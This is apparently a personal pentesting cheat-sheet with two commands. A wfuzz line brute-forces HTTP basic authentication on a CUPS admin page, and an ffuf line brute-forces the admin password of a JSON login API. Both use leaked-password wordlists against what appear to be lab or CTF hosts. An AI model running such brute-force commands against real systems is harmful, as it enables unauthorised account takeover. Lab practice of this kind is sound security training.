# Wfuzz
```
wfuzz -c -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --basic <usuario>:FUZZ -u http://192.168.1.93:631/admin/ -b "<cookies>" -d "<POST data>" --hc 401
```

# Ffuf
```
ffuf -u 'http://management.escobar.hmv/api/login'  -H 'Content-Type: application/json' -d '{"username":"admin","password":"FUZZ","recaptcha":""}' -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt -X POST
```